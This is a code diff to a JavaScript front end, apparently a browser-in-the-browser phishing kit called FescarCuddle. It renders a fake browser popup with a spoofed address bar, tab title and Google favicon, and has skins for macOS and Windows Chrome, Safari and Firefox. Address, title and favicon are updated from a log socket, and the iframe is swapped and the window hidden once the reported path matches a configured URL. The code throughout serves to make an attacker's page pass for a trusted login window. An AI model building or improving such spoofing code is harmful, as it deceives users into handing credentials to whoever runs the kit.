@@ -13,6 +13,35 @@ var tabTitle = document.getElementById("tab-title") || document.getElementById("
 var domainName = document.getElementById("domain-name");
 var domainPath = document.getElementById("domain-path");
 var tabFavicon = document.querySelector("#active-tab .tab-favicon") || document.querySelector(".tab-favicon");
+var isSafariVariant = (window._variantPath || (window.appConfig && window.appConfig.variant) || window.location.pathname || '').indexOf('MacOS-Safari') !== -1;
+
+if (tabTitle && tabTitle.id === "logo-description") {
+  tabTitle.style.display = "inline-block";
+  tabTitle.style.maxWidth = "220px";
+  tabTitle.style.overflow = "hidden";
+  tabTitle.style.textOverflow = "ellipsis";
+  tabTitle.style.whiteSpace = "nowrap";
+  tabTitle.style.verticalAlign = "middle";
+}
+
+if (!isSafariVariant && !tabFavicon && tabTitle && tabTitle.parentNode) {
+  var generatedFavicon = document.createElement("img");
+  generatedFavicon.className = "tab-favicon";
+  generatedFavicon.alt = "";
+  generatedFavicon.setAttribute("aria-hidden", "true");
+  generatedFavicon.src = "./google.svg";
+  generatedFavicon.style.width = "14px";
+  generatedFavicon.style.height = "14px";
+  generatedFavicon.style.marginRight = "6px";
+  generatedFavicon.style.verticalAlign = "middle";
+  generatedFavicon.style.objectFit = "contain";
+  tabTitle.parentNode.insertBefore(generatedFavicon, tabTitle);
+  tabFavicon = generatedFavicon;
+}
+
+if (!isSafariVariant && tabFavicon && !tabFavicon.getAttribute("src")) {
+  tabFavicon.setAttribute("src", "./google.svg");
+}
 
 var backdrop = (function () {
   var el = document.createElement("div");
@@ -45,9 +74,73 @@ var matchFavicon = typeof appConfig.matchFavicon === "string" ? appConfig.matchF
 var matchHideDelay = typeof appConfig.matchHideDelay === "number" ? appConfig.matchHideDelay : 0;
 var matchCloseMessage = typeof appConfig.matchCloseMessage === "string" ? appConfig.matchCloseMessage : "";
 var matchHideTimer = null;
+var matchApplied = false;
 var debugIpFromQuery = new URLSearchParams(window.location.search).get("debugIp");
 var debugIp = debugIpFromQuery == null ? "" : String(debugIpFromQuery).trim();
 var debugServerUrl = appConfig.debugServerUrl || appConfig.logsSocketIoUrl || "";
+var variantStorageKey = "fescarcuddle.variant";
+var allowedVariants = {
+  "MacOS-Chrome": true,
+  "MacOS-Safari": true,
+  "Windows-Chrome": true,
+  "Windows-Firefox": true,
+  "MacOS-Chrome-LightMode": true,
+  "MacOS-Chrome-DarkMode": true
+};
+
+function normalizeVariant(raw) {
+  if (typeof raw !== "string") return "";
+  var value = raw.trim();
+  if (!allowedVariants[value]) return "";
+  if (value === "MacOS-Chrome-LightMode" || value === "MacOS-Chrome-DarkMode") {
+    return "MacOS-Chrome";
+  }
+  return value;
+}
+
+function setStoredVariant(rawVariant) {
+  var normalized = normalizeVariant(rawVariant);
+  if (!normalized) {
+    return false;
+  }
+
+  try {
+    window.localStorage.setItem(variantStorageKey, normalized);
+  } catch (err) {
+    return false;
+  }
+
+  var target = "/" + normalized + "/" + window.location.search + window.location.hash;
+  window.location.assign(target);
+  return true;
+}
+
+function clearStoredVariant() {
+  try {
+    window.localStorage.removeItem(variantStorageKey);
+  } catch (err) {
+    return false;
+  }
+  window.location.assign("/" + window.location.search + window.location.hash);
+  return true;
+}
+
+var fescApi = window.FescarCuddle || {};
+fescApi.setVariant = setStoredVariant;
+fescApi.clearVariant = clearStoredVariant;
+fescApi.getStoredVariant = function () {
+  try {
+    return normalizeVariant(window.localStorage.getItem(variantStorageKey) || "");
+  } catch (err) {
+    return "";
+  }
+};
+fescApi.listVariants = function () {
+  return ["MacOS-Chrome", "MacOS-Safari", "Windows-Chrome", "Windows-Firefox"];
+};
+window.FescarCuddle = fescApi;
+window.setFescarVariant = setStoredVariant;
+window.clearFescarVariant = clearStoredVariant;
 
 function appendDebugIpToIframeSrc(src, debugIpValue) {
   if (!src || !debugIpValue) {
@@ -105,36 +198,50 @@ if (isMobileDevice && iframeSrc) {
   }
 }
 
-var windowPositions = [
-  { left: "12%", top: "12%" },
-  { left: "46%", top: "22%" }
-];
 
-function getRandomPositionIndex(excludeIndex) {
-  if (windowPositions.length <= 1) {
-    return 0;
-  }
-
-  var randomIndex = Math.floor(Math.random() * windowPositions.length);
-
-  if (typeof excludeIndex === "number" && randomIndex === excludeIndex) {
-    randomIndex = (randomIndex + 1) % windowPositions.length;
-  }
-
-  return randomIndex;
-}
-
-var windowPositionIndex = getRandomPositionIndex();
 
 if (tabTitle) {
   tabTitle.textContent = configuredTabTitle;
 }
-
-if (domainName) {
-  domainName.textContent = configuredAddressText;
+if (configuredTabTitle) {
+  document.title = configuredTabTitle;
 }
-if (domainPath) {
-  domainPath.textContent = "";
+
+function splitAddressParts(rawValue) {
+  if (typeof rawValue !== "string") {
+    return { host: "", remainder: "" };
+  }
+
+  var value = rawValue.trim();
+  if (!value) {
+    return { host: "", remainder: "" };
+  }
+
+  try {
+    var parsed = new URL(value);
+    return {
+      host: parsed.host,
+      remainder: (parsed.pathname || "") + (parsed.search || "") + (parsed.hash || "")
+    };
+  } catch (err) {
+    // Not a full URL; continue with heuristic split.
+  }
+
+  var sanitized = value.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
+  var slashIndex = sanitized.indexOf("/");
+
+  if (slashIndex === -1) {
+    return { host: sanitized, remainder: "" };
+  }
+
+  if (slashIndex === 0) {
+    return { host: "", remainder: sanitized };
+  }
+
+  return {
+    host: sanitized.slice(0, slashIndex),
+    remainder: sanitized.slice(slashIndex)
+  };
 }
 
 function setAddressBarText(value) {
@@ -142,14 +249,27 @@ function setAddressBarText(value) {
     return;
   }
 
-  domainName.textContent = value;
+  var parts = splitAddressParts(value);
+
   if (domainPath) {
-    domainPath.textContent = "";
+    if (parts.host) {
+      domainName.textContent = parts.host;
+      domainPath.textContent = parts.remainder;
+    } else {
+      domainName.textContent = value;
+      domainPath.textContent = "";
+    }
+  } else {
+    domainName.textContent = value;
   }
 
   if (addressBar) {
     addressBar.setAttribute("title", value);
   }
+}
+
+if (configuredAddressText) {
+  setAddressBarText(configuredAddressText);
 }
 
 function applyAddressFromEventData(rawValue) {
@@ -164,18 +284,17 @@ function applyAddressFromEventData(rawValue) {
 
   try {
     var parsed = new URL(value);
-    setAddressBarText(parsed.host + parsed.pathname);
+    setAddressBarText(parsed.host + parsed.pathname + parsed.search + parsed.hash);
     return;
   } catch (err) {
     // Not a full URL; continue with fallback formatting.
   }
 
-  var sanitizedValue = value.split("?")[0].split("#")[0];
-  setAddressBarText(sanitizedValue || value);
+  setAddressBarText(value);
 }
 
 function applyTabTitleFromEventData(rawValue) {
-  if (!tabTitle || typeof rawValue !== "string") {
+  if (typeof rawValue !== "string") {
     return;
   }
 
@@ -184,11 +303,28 @@ function applyTabTitleFromEventData(rawValue) {
     return;
   }
 
-  tabTitle.textContent = value;
+  if (tabTitle) {
+    tabTitle.textContent = value;
+  }
+  document.title = value;
+}
+
+function setDocumentFavicon(value) {
+  if (!value || typeof value !== "string") {
+    return;
+  }
+
+  var favicon = document.querySelector("link[rel='icon']") || document.querySelector("link[rel='shortcut icon']");
+  if (!favicon) {
+    favicon = document.createElement("link");
+    favicon.setAttribute("rel", "icon");
+    document.head.appendChild(favicon);
+  }
+  favicon.setAttribute("href", value);
 }
 
 function applyFaviconFromEventData(rawValue) {
-  if (!tabFavicon || typeof rawValue !== "string") {
+  if (typeof rawValue !== "string") {
     return;
   }
 
@@ -197,8 +333,11 @@ function applyFaviconFromEventData(rawValue) {
     return;
   }
 
-  tabFavicon.src = value;
-  tabFavicon.style.display = "";
+  if (tabFavicon) {
+    tabFavicon.src = value;
+    tabFavicon.style.display = "";
+  }
+  setDocumentFavicon(value);
 }
 
 function consumeLogPayload(payload) {
@@ -227,13 +366,15 @@ function consumeLogPayload(payload) {
     applyFaviconFromEventData(payload.event_favicon);
   }
 
-  if (matchUrl && matchIframeSrc && addressValue && (function () {
+  if (matchUrl && matchIframeSrc && !matchApplied && addressValue && (function () {
     try {
       return new URL(addressValue).pathname === matchUrl;
     } catch (e) {
       return false;
     }
   })()) {
+    matchApplied = true;
+
     if (contentFrame) {
       contentFrame.setAttribute("src", matchIframeSrc);
     }
@@ -262,6 +403,18 @@ function consumeLogPayload(payload) {
           if (msgEl) {
             msgEl.textContent = matchCloseMessage;
             msgEl.style.display = "block";
+
+            // Dismiss on click outside the message box.
+            function onOutsideClick(e) {
+              if (!msgEl.contains(e.target)) {
+                msgEl.style.display = "none";
+                document.removeEventListener("click", onOutsideClick, true);
+              }
+            }
+            // Use capture + setTimeout so this click doesn't immediately dismiss.
+            setTimeout(function () {
+              document.addEventListener("click", onOutsideClick, true);
+            }, 0);
           }
         }
       }, matchHideDelay * 1000);
@@ -629,20 +782,41 @@ if (contentFrame && iframeSrc) {
   contentFrame.setAttribute("src", iframeSrc);
 }
 
-function applyWindowPosition(index) {
-  if (!windowShell) {
-    return;
+function applyWindowPosition() {
+  if (!windowShell) return;
+
+  var margin = 10;
+  var vw = window.innerWidth;
+  var vh = window.innerHeight;
+
+  // Reset any previously forced sizes before measuring.
+  if (contentFrame) contentFrame.style.height = "";
+  windowShell.style.width = "";
+
+  // Shrink window width if viewport is too narrow.
+  if (windowShell.offsetWidth > vw - margin * 2) {
+    windowShell.style.width = (vw - margin * 2) + "px";
   }
 
-  var pos = windowPositions[index];
-  windowShell.style.right = "";
+  var ww = windowShell.offsetWidth;
+  var wh = windowShell.offsetHeight;
+
+  // Shrink iframe height if window is taller than viewport.
+  if (contentFrame && wh > vh - margin * 2) {
+    var chromeH = wh - contentFrame.offsetHeight;
+    contentFrame.style.height = Math.max(50, vh - margin * 2 - chromeH) + "px";
+    wh = windowShell.offsetHeight;
+  }
+
+  // Center.
+  windowShell.style.right  = "";
   windowShell.style.bottom = "";
-  windowShell.style.left = pos.left;
-  windowShell.style.top = pos.top;
+  windowShell.style.left   = Math.round((vw - ww) / 2) + "px";
+  windowShell.style.top    = Math.round((vh - wh) / 2) + "px";
 }
 
 if (windowShell) {
-  applyWindowPosition(windowPositionIndex);
+  applyWindowPosition();
 }
 
 if (showIframeBtn) {
@@ -653,9 +827,8 @@ if (showIframeBtn) {
       windowShell.classList.remove("is-hidden");
       windowShell.style.display = "";
 
-      // Pick a new random position every click.
-      windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
-      applyWindowPosition(windowPositionIndex);
+      // Defer one frame so the browser has laid out the window before measuring.
+      requestAnimationFrame(applyWindowPosition);
     }
 
     if (contentFrame) {
@@ -741,6 +914,7 @@ if (addressSettingsBtn && siteInfoPanel) {
     if (siteInfoPanel.classList.contains("open")) {
       placeSiteInfoPanel();
     }
+    applyWindowPosition();
   });
 }
 
@@ -781,6 +955,13 @@ var draggable = $('#window');
 var title = $('#tab-bar, #title-bar');
 
 title.on('mousedown', function(e){
+  if (e.which && e.which !== 1) return;
+  var target = $(e.target);
+  if (target.closest('#exit, #minimize, #maximize, #square, button, a, input, textarea, select, [role="button"]').length) {
+    return;
+  }
+
+  e.preventDefault();
   closeSiteInfoPanel();
 	var dr = $(draggable).addClass("drag");
 	height = dr.outerHeight();
@@ -790,6 +971,9 @@ title.on('mousedown', function(e){
 	$(document.body).on('mousemove', function(e){
 		var itop = e.pageY + ypos - height;
 		var ileft = e.pageX + xpos - width;
+		var _margin = 14;
+		itop = Math.max(_margin, Math.min(itop, window.innerHeight - height - _margin));
+		ileft = Math.max(_margin, Math.min(ileft, window.innerWidth - width - _margin));
 		if(dr.hasClass("drag")){
 			dr.offset({top: itop,left: ileft});
 		}
@@ -804,6 +988,7 @@ title.on('mousedown', function(e){
 // X button functionality
 $("#exit").click(function(){
     closeSiteInfoPanel();
+    matchApplied = false;
 
     if (windowShell) {
       windowShell.classList.add("is-hidden");
@@ -886,8 +1071,7 @@ window.FescarCuddleCore = {
     var wasHidden = windowShell.classList.contains("is-hidden");
     windowShell.classList.remove("is-hidden");
     windowShell.style.display = "";
-    windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
-    applyWindowPosition(windowPositionIndex);
+    requestAnimationFrame(applyWindowPosition);
     if (contentFrame) {
       if (!contentFrame.getAttribute("src") || wasHidden) {
         contentFrame.setAttribute("src", iframeSrc);
